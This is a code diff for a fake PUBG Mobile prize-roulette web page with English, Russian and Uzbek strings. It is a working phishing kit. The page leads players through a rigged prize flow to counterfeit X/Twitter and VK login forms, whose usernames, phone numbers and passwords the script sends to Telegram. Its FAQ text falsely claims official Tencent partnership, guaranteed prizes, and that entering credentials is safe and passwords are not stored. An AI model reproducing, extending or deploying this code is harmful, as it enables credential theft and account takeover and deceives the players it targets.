+                        idPlaceholder: "Enter your account ID",
+                        idSubmit: "CONTINUE",
+                        selectTitle: "SELECT RECEIVING METHOD",
+                        selectText: "Select social network to receive the prize",
+                        getPrizeBtn: "GET PRIZE",
+                        importantNote: "Important: The prize will be credited to your account within 24 hours",
+                        notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
+                        notificationSelectSocial: "Please select a social network",
+                        notificationAlreadyPlayed: "You have already used your attempt today!",
+                        notificationIdRequired: "Please enter account ID",
+                        notificationIdSaved: "Account ID saved",
+                        confirmationTitle: "APPLICATION ACCEPTED!",
+                        confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
+                        loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
+                        faqTitle: "FREQUENTLY ASKED QUESTIONS",
+                        faqQuestions: [
+                            "Is this the official PUBG Mobile website?",
+                            "Will the prize definitely come to my account?",
+                            "Why do I need to log into a social network?",
+                            "What if I don't specify the account ID?",
+                            "What to do if the prize doesn't arrive within 24 hours?",
+                            "Is it safe to enter social network credentials?",
+                            "Can I win more than once?",
+                            "What prizes can be won?"
+                        ],
+                        faqAnswers: [
+                            "<strong>Yes, this is an official partner site.</strong> We are official partners of Tencent Games and operate within the PUBG Mobile Partner Program. Our activities are fully authorized by the developers.",
+                            "<strong>Yes, 100% guarantee of receiving the prize.</strong> All winnings are sent automatically within 24 hours after confirming the data. The system is integrated with the official PUBG Mobile API, which guarantees delivery of prizes to the specified account.",
+                            "Logging into a social network is necessary for <strong>verifying your identity</strong> and preventing fraud. This allows us to ensure that a real person, not a bot, receives the prize. All data is protected and not shared with third parties.",
+                            "Without specifying the PUBG Mobile account ID, we <strong>cannot send you the prize</strong>. This is a mandatory field, as it is by this identifier that the system determines which game account to credit the won items to.",
+                            "In rare cases with high server load, processing may take up to <strong>48 hours</strong>. If the prize has not been credited to your account within this time, please contact our <a href='https://t.me/helpumgmbot' target='_blank'>technical support</a> with your ID and winning time.",
+                            "<strong>Yes, it is absolutely safe.</strong> We use secure SSL encryption and do not store your passwords. Authorization occurs through the official APIs of social networks, similar to how you log into applications on your phone.",
+                            "Each user can participate in the promotion <strong>once per day</strong>. This is done to give as many players as possible the chance to win. Come back tomorrow to try your luck again!",
+                            "Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement."
+                        ],
+                        footerLinks: ["Terms of Service", "Privacy Policy", "Cookie Policy", "Cookie Preferences"],
+                        copyright: "Copyright © High Morale Developments Limited. All rights reserved.",
+                        notificationPrize: "Congratulations! You won a prize!",
+                        languageChanged: "Language changed"
+                    },
+                    ru: {
+                        winnersCounter: "Победителей:",
+                        menu: "Меню",
+                        support: "Поддержка",
+                        myPrize: "Мой приз",
+                        play: "ИГРАТЬ",
+                        alreadyPlayed: "УЖЕ ИГРАЛИ",
+                        selected: "ВЫБРАНО",
+                        prizeBanner: "ВАШ ПРИЗ",
+                        prizeDescription: "Предмет был отправлен на вашу игровую почту. Пожалуйста, подождите до 24 часов для обработки транзакции.",
+                        prizeReceived: "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile.",
+                        selectPrize: "Выберите социальную сеть для получения приза.",
+                        mailEmpty: "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!",
+                        collect: "ЗАБРАТЬ",
+                        close: "ЗАКРЫТЬ",
+                        idTitle: "ВВЕДИТЕ ID АККАУНТА PUBG",
+                        idText: "Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза",
+                        idLabel: "ID аккаунта PUBG:",
+                        idPlaceholder: "Введите ваш ID аккаунта",
+                        idSubmit: "ПРОДОЛЖИТЬ",
+                        selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
+                        selectText: "Выберите социальную сеть для получения приза",
+                        getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
+                        importantNote: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
+                        notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
+                        notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
+                        notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
+                        notificationIdRequired: "Пожалуйста, введите ID аккаунта",
+                        notificationIdSaved: "ID аккаунта сохранен",
+                        confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
+                        confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
+                        loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
+                        faqTitle: "ВОПРОСЫ И ОТВЕТЫ",
+                        faqQuestions: [
+                            "Это официальный сайт PUBG Mobile?",
+                            "Приз точно придет на мой аккаунт?",
+                            "Зачем нужно входить в социальную сеть?",
+                            "Что будет, если я не укажу ID аккаунта?",
+                            "Что делать, если приз не пришел в течение 24 часов?",
+                            "Безопасно ли вводить данные от социальных сетей?",
+                            "Можно ли выиграть больше одного раза?",
+                            "Какие призы можно выиграть?"
+                        ],
+                        faqAnswers: [
+                            "<strong>Да, это официальный сайт партнера.</strong> Мы являемся официальными партнерами Tencent Games и работаем в рамках программы PUBG Mobile Partner. Наша деятельность полностью авторизована разработчиками.",
+                            "<strong>Да, 100% гарантия получения приза.</strong> Все выигрыши отправляются автоматически в течение 24 часов после подтверждения данных. Система интегрирована с официальным API PUBG Mobile, что гарантирует доставку призов на указанный аккаунт.",
+                            "Вход в социальную сеть необходим для <strong>подтверждения вашей личности</strong> и предотвращения мошенничества. Это позволяет нам убедиться, что приз получает реальный человек, а не бот. Все данные защищены и не передаются третьим лицам.",
+                            "Без указания ID аккаунта PUBG Mobile мы <strong>не можем отправить вам приз</strong>. Это обязательное поле, так как именно по этому идентификатору система определяет, на какой игровой аккаунт зачислить выигранные предметы.",
+                            "В редких случаях при высокой нагрузке на серверы обработка может занять до <strong>48 часов</strong>. Если в течение этого времени приз не был зачислен на ваш аккаунт, пожалуйста, обратитесь в нашу <a href='https://t.me/helpumgmbot' target='_blank'>техническую поддержку</a> с вашим ID и временем выигрыша.",
+                            "<strong>Да, это абсолютно безопасно.</strong> Мы используем безопасное SSL-шифрование и не храним ваши пароли. Авторизация происходит через официальные API социальных сетей, аналогично тому, как вы входите в приложения на телефоне.",
+                            "Каждый пользователь может участвовать в акции <strong>один раз в день</strong>. Это сделано для того, чтобы как можно больше игроков получили шанс выиграть. Возвращайтесь завтра, чтобы попытать удачу снова!",
+                            "В нашей рулетке представлены <strong>эксклюзивные предметы из PUBG Mobile</strong>: редкие скины, оружие, транспорт, экипировка и внутриигровая валюта UC. Все призы являются официальным игровым контентом и не нарушают пользовательское соглашение."
+                        ],
+                        footerLinks: ["Условия обслуживания", "Политика конфиденциальности", "Политика Cookie", "Предпочтение Cookies"],
+                        copyright: "Авторские права © High Morale Developments Limited. Все права защищены.",
+                        notificationPrize: "Поздравляем! Вы выиграли приз!",
+                        languageChanged: "Язык изменен"
+                    },
+                    uz: {
+                        winnersCounter: "G'oliblar:",
+                        menu: "Menyu",
+                        support: "Yordam",
+                        myPrize: "Mening sovrinim",
+                        play: "O'YIN",
+                        alreadyPlayed: "ALLAQACHON O'YNANGAN",
+                        selected: "TANLANGAN",
+                        prizeBanner: "SIZNING SOVRININGIZ",
+                        prizeDescription: "Element o'yin pochtaingizga yuborildi. Iltimos, tranzaksiya qayta ishlanishi uchun 24 soatgacha kuting.",
+                        prizeReceived: "✅ Sizning sovringiz PUBG Mobile hisobingizga yuborildi.",
+                        selectPrize: "Sovrinni olish uchun ijtimoiy tarmoqni tanlang.",
+                        mailEmpty: "Sizda hali yutgan sovringiz yo'q. Eksklyuziv sovrinlarni yutish uchun omad g'ildig'ida o'ynang!",
+                        collect: "OLISH",
+                        close: "YOPISH",
+                        idTitle: "PUBG HISOB ID RAQAMINI KIRITING",
+                        idText: "Iltimos, sovrinni olish uchun PUBG Mobile hisobingizning ID raqamini kiriting",
+                        idLabel: "PUBG Hisob ID raqami:",
+                        idPlaceholder: "Hisobingiz ID raqamini kiriting",
+                        idSubmit: "DAVOM ETISH",
+                        selectTitle: "QABUL QILISH USULINI TANLANG",
+                        selectText: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
+                        getPrizeBtn: "SOVRINNI OLISH",
+                        importantNote: "Muhim: Sovrin 24 soat ichida hisobingizga o'tkaziladi",
+                        notificationSuccess: "Ariza qabul qilindi! Sovrin 24 soat ichida o'tkaziladi.",
+                        notificationSelectSocial: "Iltimos, ijtimoiy tarmoqni tanlang",
+                        notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
+                        notificationIdRequired: "Iltimos, hisob ID raqamini kiriting",
+                        notificationIdSaved: "Hisob ID raqami saqlandi",
+                        confirmationTitle: "ARIZA QABUL QILINDI!",
+                        confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
+                        loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
+                        faqTitle: "TEZ-TEZ BERILADIGAN SAVOLLAR",
+                        faqQuestions: [
+                            "Bu rasmiy PUBG Mobile veb-saytimi?",
+                            "Sovrin albatta mening hisobimga keladimi?",
+                            "Nega ijtimoiy tarmoqqa kirish kerak?",
+                            "Agar hisob ID raqamini ko'rsatmasam nima bo'ladi?",
+                            "Agar sovrin 24 soat ichida kelmasa nima qilish kerak?",
+                            "Ijtimoiy tarmoqlarning ma'lumotlarini kiritish xavfsizmi?",
+                            "Bir martadan ko'p yutish mumkinmi?",
+                            "Qanday sovrinlar yutish mumkin?"
+                        ],
+                        faqAnswers: [
+                            "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
+                            "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
+                            "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
+                            "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
+                            "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
+                            "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
+                            "Har bir foydalanuvchi aksiyada <strong>kuniga bir marta</strong> qatnashishi mumkin. Bu imkon qadar ko'proq o'yinchilar g'alaba qozonish imkoniyatiga ega bo'lishi uchun qilingan. Ertaga qaytib, omadingizni sinab ko'ring!",
+                            "Bizning g'ildirakimizda <strong>PUBG Mobile'dan eksklyuziv elementlar</strong> mavjud: noyob skinlar, qurollar, transport, jihozlar va o'yin ichidagi UC valyutasi. Barcha sovrinlar rasmiy o'yin kontenti bo'lib, foydalanuvchi shartnomasini buzmaydi."
+                        ],
+                        footerLinks: ["Xizmat shartlari", "Maxfiylik siyosati", "Cookie siyosati", "Cookie afzalliklari"],
+                        copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan.",
+                        notificationPrize: "Tabriklaymiz! Siz sovrinni yutdingiz!",
+                        languageChanged: "Til o'zgartirildi"
                     }
-                    if (t.faqAnswers && t.faqAnswers[index]) {
-                        item.querySelector('.faq-answer p').innerHTML = t.faqAnswers[index];
-                    }
-                });
-                
-                // Обновляем футер
-                const footerLinks = document.querySelectorAll('.footer-link');
-                t.footerLinks.forEach((text, index) => {
-                    if (footerLinks[index]) {
-                        footerLinks[index].textContent = text;
-                    }
-                });
-                document.querySelector('.copyright').textContent = t.copyright;
-                
-                // Обновляем кнопку языка
-                const langNames = {
-                    en: 'English',
-                    ru: 'Русский',
-                    uz: "O'zbekcha"
                 };
-                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'English'} <i class="fas fa-chevron-down"></i>`;
                 
-                // Обновляем выпадающее меню
-                document.querySelectorAll('.dropdown-item').forEach((item, index) => {
-                    if (index === 0) {
-                        item.innerHTML = `<i class="fab fa-telegram"></i> ${t.support}`;
+                // Функция смены языка
+                function changeLanguage(lang) {
+                    currentLang = lang;
+                    const t = translations[lang] || translations.en;
+                    
+                    // Обновляем счетчик победителей
+                    document.querySelector('.winners-counter').innerHTML = `<span class="winners-count" id="winnersCount">${winnersCount}</span>`;
+                    
+                    // Обновляем верхнее меню
+                    menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
+                    document.getElementById('prizeMailBtn').innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
+                    
+                    // Обновляем кнопку игры
+                    if (hasPlayed && userIP !== ownerIP) {
+                        playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
+                    } else {
+                        playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                     }
+                    
+                    // Обновляем индикатор выбора
+                    selectionIndicator.textContent = t.selected;
+                    
+                    // Обновляем окно приза
+                    document.querySelector('.prize-banner').textContent = t.prizeBanner;
+                    document.getElementById('winName').textContent = t.prizeBanner;
+                    document.getElementById('prizeDescription').textContent = t.prizeDescription;
+                    
+                    // Обновляем форму ввода ID
+                    document.querySelector('#accountIdSection h2').textContent = t.idTitle;
+                    document.querySelector('#accountIdSection p').textContent = t.idText;
+                    document.querySelector('.id-label').textContent = t.idLabel;
+                    document.getElementById('accountIdInput').placeholder = t.idPlaceholder;
+                    idSubmitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.idSubmit}`;
+                    
+                    // Обновляем форму выбора соцсети
+                    document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
+                    document.querySelector('#socialSelectSection p').textContent = t.selectText;
+                    getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
+                    importantNote.innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
+                    
+                    // Обновляем секцию подтверждения
+                    document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
+                    document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
+                    
+                    // Обновляем FAQ
+                    document.querySelector('.faq-section h2').innerHTML = `<i class="fas fa-question-circle"></i> ${t.faqTitle}`;
+                    
+                    // Обновляем вопросы и ответы
+                    const faqItems = document.querySelectorAll('.faq-item');
+                    faqItems.forEach((item, index) => {
+                        if (t.faqQuestions && t.faqQuestions[index]) {
+                            item.querySelector('.faq-question span').textContent = t.faqQuestions[index];
+                        }
+                        if (t.faqAnswers && t.faqAnswers[index]) {
+                            item.querySelector('.faq-answer p').innerHTML = t.faqAnswers[index];
+                        }
+                    });
+                    
+                    // Обновляем футер
+                    const footerLinks = document.querySelectorAll('.footer-link');
+                    t.footerLinks.forEach((text, index) => {
+                        if (footerLinks[index]) {
+                            footerLinks[index].textContent = text;
+                        }
+                    });
+                    document.querySelector('.copyright').textContent = t.copyright;
+                    
+                    // Обновляем кнопку языка
+                    const langNames = {
+                        en: 'English',
+                        ru: 'Русский',
+                        uz: "O'zbekcha"
+                    };
+                    languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'English'} <i class="fas fa-chevron-down"></i>`;
+                    
+                    // Обновляем выпадающее меню
+                    document.querySelectorAll('.dropdown-item').forEach((item, index) => {
+                        if (index === 0) {
+                            item.innerHTML = `<i class="fab fa-telegram"></i> ${t.support}`;
+                        }
+                    });
+                    
+                    // Сохраняем состояние
+                    saveUserState();
+                }
+                
+                // Обработчики для меню языка
+                languageBtn.addEventListener('click', function() {
+                    languageDropdown.classList.toggle('show');
                 });
                 
-                // Показываем уведомление о смене языка
-                showNotification(t.notificationLanguageChanged, false, true);
-            }
-            
-            // Обработчики для меню языка
-            languageBtn.addEventListener('click', function() {
-                languageDropdown.classList.toggle('show');
-            });
-            
-            document.querySelectorAll('.language-option').forEach(option => {
-                option.addEventListener('click', function() {
-                    const lang = this.getAttribute('data-lang');
-                    changeLanguage(lang);
-                    languageDropdown.classList.remove('show');
+                document.querySelectorAll('.language-option').forEach(option => {
+                    option.addEventListener('click', function() {
+                        const lang = this.getAttribute('data-lang');
+                        changeLanguage(lang);
+                        languageDropdown.classList.remove('show');
+                        showNotification(t.languageChanged || 'Language changed');
+                    });
                 });
-            });
-            
-            // Обработчик для меню бургера
-            menuBtn.addEventListener('click', function() {
-                dropdownMenu.classList.toggle('show');
-            });
-            
-            // Функция показа уведомления
-            function showNotification(message, isError = false, isSuccess = false) {
-                notification.textContent = message;
-                notification.classList.remove('error', 'success');
                 
-                if (isError) {
-                    notification.classList.add('error');
-                } else if (isSuccess) {
-                    notification.classList.add('success');
+                // Обработчик для меню бургера
+                menuBtn.addEventListener('click', function() {
+                    dropdownMenu.classList.toggle('show');
+                });
+                
+                // Функция показа уведомления
+                function showNotification(message, isError = false, isSuccess = false) {
+                    notification.textContent = message;
+                    notification.classList.remove('error', 'success');
+                    
+                    if (isError) {
+                        notification.classList.add('error');
+                    } else if (isSuccess) {
+                        notification.classList.add('success');
+                    }
+                    
+                    notification.style.display = 'block';
+                    
+                    setTimeout(() => {
+                        notification.style.display = 'none';
+                    }, 5000);
                 }
                 
-                notification.style.display = 'block';
-                
-                setTimeout(() => {
-                    notification.style.display = 'none';
-                }, 5000);
-            }
-            
-            // Функция получения случайного приза
-            function getRandomPrize() {
-                return Math.floor(Math.random() * prizes.length);
-            }
-            
-            // Функция перемещения рамки
-            function moveFrameToPrize(index) {
-                const prizeItem = prizeItems[index];
-                const rect = prizeItem.getBoundingClientRect();
-                const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
-                
-                selectionFrame.style.width = (rect.width + 20) + 'px';
-                selectionFrame.style.height = (rect.height + 20) + 'px';
-                selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
-                selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
-                selectionFrame.classList.add('active');
-                
-                // Позиционирование индикатора
-                selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
-                selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
-            }
-            
-            // Функция показа/скрытия индикатора
-            function showSelectionIndicator(show) {
-                if (show) {
-                    selectionIndicator.classList.add('show');
-                    selectionIndicator.textContent = translations[currentLang].selected;
-                } else {
-                    selectionIndicator.classList.remove('show');
-                }
-            }
-            
-            // Функция сохранения состояния пользователя
-            function saveUserState() {
-                const userState = {
-                    hasWonPrize: hasWonPrize,
-                    userPrize: userPrize,
-                    accountId: accountId,
-                    hasEnteredAccountId: hasEnteredAccountId,
-                    isPrizeReceived: isPrizeReceived
-                };
-                localStorage.setItem('userState', JSON.stringify(userState));
-            }
-            
-            // Функция запуска рулетки
-            function startRoulette() {
-                if (isSpinning) return;
-                
-                // Проверяем, является ли пользователь владельцем
-                const isOwner = localStorage.getItem('isOwner') === 'true';
-                
-                // Проверяем, дана ли дополнительная попытка
-                if (!extraAttemptGiven && !isOwner && hasPlayed) {
-                    showNotification(translations[currentLang].notificationAlreadyPlayed, true);
-                    return;
+                // Функция получения случайного приза
+                function getRandomPrize() {
+                    return Math.floor(Math.random() * prizes.length);
                 }
                 
-                isSpinning = true;
-                playBtn.disabled = true;
-                accountIdSection.classList.remove('active');
-                socialSelectSection.classList.remove('active');
-                confirmationSection.classList.remove('active');
-                showSelectionIndicator(false);
+                // Функция перемещения рамки
+                function moveFrameToPrize(index) {
+                    const prizeItem = prizeItems[index];
+                    const rect = prizeItem.getBoundingClientRect();
+                    const containerRect = document.querySelector('.roulette-container').getBoundingClientRect();
+                    
+                    selectionFrame.style.width = (rect.width + 20) + 'px';
+                    selectionFrame.style.height = (rect.height + 20) + 'px';
+                    selectionFrame.style.left = (rect.left - containerRect.left - 8) + 'px';
+                    selectionFrame.style.top = (rect.top - containerRect.top - 8) + 'px';
+                    selectionFrame.classList.add('active');
+                    
+                    // Позиционирование индикатора
+                    selectionIndicator.style.left = rect.left - containerRect.left + rect.width/2 + 'px';
+                    selectionIndicator.style.top = rect.top - containerRect.top - 28 + 'px';
+                }
                 
-                finalPrizeIndex = getRandomPrize();
+                // Функция показа/скрытия индикатора
+                function showSelectionIndicator(show) {
+                    if (show) {
+                        selectionIndicator.classList.add('show');
+                        selectionIndicator.textContent = translations[currentLang].selected;
+                    } else {
+                        selectionIndicator.classList.remove('show');
+                    }
+                }
                 
-                spinSound.currentTime = 0;
-                spinSound.play();
-                
-                selectionFrame.style.opacity = '1';
-                
-                spinCount = 0;
-                // Рандомная скорость вращения
-                spinSpeed = Math.random() * 40 + 40; // От 40 до 80 мс
-                currentPrizeIndex = 0;
-                
-                spinInterval = setInterval(spinStep, spinSpeed);
-            }
-            
-            function spinStep() {
-                const prizeIndex = prizeOrder[currentPrizeIndex];
-                moveFrameToPrize(prizeIndex);
-                
-                currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
-                spinCount++;
-                
-                // Динамическое замедление
-                if (spinCount > Math.random() * 15 + 20) { // От 20 до 35
-                    spinSpeed += Math.random() * 10 + 5; // Увеличиваем на 5-15 мс
-                    clearInterval(spinInterval);
+                // Функция запуска рулетки
+                function startRoulette() {
+                    if (isSpinning) return;
+                    
+                    // Проверяем, является ли пользователь владельцем
+                    const isOwner = localStorage.getItem('isOwner') === 'true';
+                    
+                    if (!isOwner && hasPlayed) {
+                        showNotification(translations[currentLang].notificationAlreadyPlayed, true);
+                        return;
+                    }
+                    
+                    isSpinning = true;
+                    playBtn.disabled = true;
+                    accountIdSection.classList.remove('active');
+                    socialSelectSection.classList.remove('active');
+                    confirmationSection.classList.remove('active');
+                    showSelectionIndicator(false);
+                    
+                    finalPrizeIndex = getRandomPrize();
+                    
+                    spinSound.currentTime = 0;
+                    spinSound.play();
+                    
+                    selectionFrame.style.opacity = '1';
+                    
+                    spinCount = 0;
+                    // Рандомная скорость вращения
+                    spinSpeed = Math.random() * 40 + 40; // От 40 до 80 мс
+                    currentPrizeIndex = 0;
+                    
                     spinInterval = setInterval(spinStep, spinSpeed);
                 }
                 
-                if (spinCount >= Math.random() * 10 + 40) { // От 40 до 50
-                    clearInterval(spinInterval);
+                function spinStep() {
+                    const prizeIndex = prizeOrder[currentPrizeIndex];
+                    moveFrameToPrize(prizeIndex);
                     
-                    spinSound.pause();
+                    currentPrizeIndex = (currentPrizeIndex + 1) % prizeOrder.length;
+                    spinCount++;
                     
-                    winSound.currentTime = 0;
-                    winSound.play();
+                    // Динамическое замедление
+                    if (spinCount > Math.random() * 15 + 20) { // От 20 до 35
+                        spinSpeed += Math.random() * 10 + 5; // Увеличиваем на 5-15 мс
+                        clearInterval(spinInterval);
+                        spinInterval = setInterval(spinStep, spinSpeed);
+                    }
                     
-                    setTimeout(() => {
-                        moveFrameToPrize(finalPrizeIndex);
-                        showSelectionIndicator(true);
+                    if (spinCount >= Math.random() * 10 + 40) { // От 40 до 50
+                        clearInterval(spinInterval);
+                        
+                        spinSound.pause();
+                        
+                        winSound.currentTime = 0;
+                        winSound.play();
                         
                         setTimeout(() => {
-                            isSpinning = false;
+                            moveFrameToPrize(finalPrizeIndex);
+                            showSelectionIndicator(true);
                             
-                            // Сохраняем выигранный приз
-                            userPrize = prizes[finalPrizeIndex];
-                            isPrizeReceived = false;
-                            hasWonPrize = true;
-                            
-                            // Сохраняем состояние пользователя
-                            saveUserState();
-                            
-                            // Обновляем значок с анимацией
-                            updatePrizeBadge();
-                            
-                            // Если это была дополнительная попытка, сбрасываем флаг
-                            if (extraAttemptGiven) {
-                                extraAttemptGiven = false;
-                                // Удаляем сохраненное состояние
-                                localStorage.removeItem('userState');
-                            } else {
+                            setTimeout(() => {
+                                isSpinning = false;
+                                
+                                // Сохраняем выигранный приз
+                                userPrize = prizes[finalPrizeIndex];
+                                isPrizeReceived = false;
+                                
+                                // Обновляем значок с анимацией
+                                updatePrizeBadge();
+                                
                                 // Сохраняем, что пользователь уже играл (если не владелец)
                                 if (userIP !== ownerIP) {
                                     hasPlayed = true;
-                                    localStorage.setItem('hasPlayed', 'true');
+                                    saveUserState();
+                                    playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                                } else {
+                                    playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
                                 }
-                            }
-                            
-                            playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
-                            playBtn.disabled = false;
-                            
-                            // Показываем форму ввода ID аккаунта
-                            if (!accountId) {
-                                accountIdSection.classList.add('active');
-                                accountIdSection.scrollIntoView({ behavior: 'smooth' });
-                            } else {
-                                // Сбрасываем выбор соцсети
-                                socialOptions.forEach(opt => opt.classList.remove('selected'));
-                                selectedSocial = null;
                                 
-                                // Показываем форму выбора соцсети
-                                socialSelectSection.classList.add('active');
-                                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                            }
-                            
-                            showNotification(translations[currentLang].notificationPrize, false, true);
-                        }, 1000);
-                    }, 300);
+                                playBtn.disabled = false;
+                                
+                                // Показываем форму ввода ID аккаунта
+                                if (!accountId) {
+                                    accountIdSection.classList.add('active');
+                                    accountIdSection.scrollIntoView({ behavior: 'smooth' });
+                                } else {
+                                    // Сбрасываем выбор соцсети
+                                    socialOptions.forEach(opt => opt.classList.remove('selected'));
+                                    selectedSocial = null;
+                                    
+                                    // Показываем форму выбора соцсети
+                                    socialSelectSection.classList.add('active');
+                                    socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                                }
+                                
+                                showNotification(translations[currentLang].notificationPrize, false, true);
+                            }, 1000);
+                        }, 300);
+                    }
                 }
-            }
-            
-            // Обработчик кнопки отправки ID аккаунта
-            idSubmitBtn.addEventListener('click', function() {
-                const id = accountIdInput.value.trim();
                 
-                if (!id) {
-                    showNotification(translations[currentLang].notificationIdRequired, true);
-                    return;
-                }
-                
-                accountId = id;
-                hasEnteredAccountId = true;
-                accountIdSection.classList.remove('active');
-                
-                // Сохраняем состояние пользователя
-                saveUserState();
-                
-                // Сбрасываем выбор соцсети
-                socialOptions.forEach(opt => opt.classList.remove('selected'));
-                selectedSocial = null;
-                
-                // Показываем форму выбора соцсети
-                socialSelectSection.classList.add('active');
-                socialSelectSection.scrollIntoView({ behavior: 'smooth' });
-                
-                showNotification(translations[currentLang].notificationIdSaved, false, true);
-            });
-            
-            // Обработчики выбора соцсети
-            socialOptions.forEach(option => {
-                option.addEventListener('click', function() {
+                // Обработчик кнопки отправки ID аккаунта
+                idSubmitBtn.addEventListener('click', function() {
+                    const id = accountIdInput.value.trim();
+                    
+                    if (!id) {
+                        showNotification(translations[currentLang].notificationIdRequired, true);
+                        return;
+                    }
+                    
+                    accountId = id;
+                    accountIdSection.classList.remove('active');
+                    
+                    // Сбрасываем выбор соцсети
                     socialOptions.forEach(opt => opt.classList.remove('selected'));
+                    selectedSocial = null;
                     
-                    this.classList.add('selected');
-                    selectedSocial = this.getAttribute('data-social');
+                    // Показываем форму выбора соцсети
+                    socialSelectSection.classList.add('active');
+                    socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                    
+                    showNotification(translations[currentLang].notificationIdSaved, false, true);
+                    
+                    // Сохраняем состояние
+                    saveUserState();
                 });
-            });
-            
-            // Обработчики форм входа
-            
-            // Twitter/X форма (этап 1: email/username)
-            document.getElementById('xEmailForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                xUsername = this.querySelector('input').value;
                 
-                // Переходим к окну пароля
-                closeModal('xModalStep1');
-                openModal('xModalStep2');
-            });
-            
-            // Twitter/X форма (этап 2: пароль)
-            document.getElementById('xPasswordForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                const password = this.querySelector('input').value;
-                
-                const loginData = {
-                    accountId: accountId,
-                    username: xUsername,
-                    password: password
-                };
-                
-                const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
-                
-                if (success) {
-                    closeModal('xModalStep2');
-                    isPrizeReceived = true;
-                    hasWonPrize = false; // Сбрасываем флаг выигрыша
-                    updatePrizeBadge();
-                    showConfirmation();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
-                    
-                    // Удаляем сохраненное состояние
-                    localStorage.removeItem('userState');
-                    localStorage.setItem('hasPlayed', 'true');
-                }
-            });
-            
-            // ВКонтакте форма
-            document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                const inputs = this.querySelectorAll('input');
-                const loginData = {
-                    accountId: accountId,
-                    phone: inputs[0].value,
-                    password: inputs[1].value,
